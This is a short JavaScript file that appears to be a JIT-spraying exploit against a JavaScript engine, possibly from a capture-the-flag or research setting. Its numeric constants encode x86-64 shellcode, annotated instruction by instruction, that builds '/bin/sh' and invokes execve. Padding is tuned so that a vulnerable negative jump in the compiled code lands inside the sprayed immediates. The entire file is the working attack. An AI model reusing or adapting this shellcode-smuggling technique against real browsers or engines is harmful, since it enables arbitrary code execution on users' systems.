for (let i = 0; i < 1; i++) {
	if (i == 0) {
		0x09eb006a;	// push 0
		0x09eb686a;	// push 0x68
		0x09eb736a;	// push 0x73
		0x09eb2f6a;	// push 0x2f
		0x09eb6e6a;	// push 0x6e
		0x09eb696a;	// push 0x69
		0x09eb626a;	// push 0x62
		0x09eb2f6a;	// push 0x2f
		0x16eb5f53;	// push rbx; pop rdi
		
		0xcc89eb;	// backward jump
		
		0x09eb9058;	// pop rax ; nop
		0x09eb0388;	// mov byte ptr [rbx], al
		0x09ebc3fe;	// inc bl
		0x09eb9058;	// same 3 instructions repeated...
		0x09eb0388;
		0x09ebc3fe;
		0x09eb9058;
		0x16eb0388;
		
		0xcc89eb;	// backward jump
		
		0x09ebc3fe;
		0x09eb9058;
		0x09eb0388;
		0x09ebc3fe;
		0x09eb9058;
		0x09eb0388;
		0x09ebc3fe;
		0x16eb9058;
		
		0xcc89eb;	// backward jump

		0x09eb0388;
		0x09ebc3fe;
		0x09eb9058;
		0x09eb0388;
		0x09ebc3fe;
		0x09eb9058;
		0x09eb0388;
		0x16ebc3fe;
		
		0xcc89eb;	// backward jump
		
		0x09ebf631;	// xor esi, esi
		0x09ebd231;	// xor edx, edx
		0x09eb3b6a;	// push 59
		0x09eb9058;	// pop rax
		0x09eb050f;	// syscall
		0x09eb0b0f;	// ud2 => terminate the program if execve fails and we reach here. used for debugging the shellcode.
		0x09ebcccc;	// padding
		0x16ebcccc;	// padding

		0xcc89eb;	// backward jump (vulnerable jump landing point)
		[];"a";[];[];	// padding to make the vulnerable negative jump land in the immediate value above
	} else {
		[];[];[];[];	// padding to trigger a vulnerable negative jump when it tries to jump over this code block
	}
}

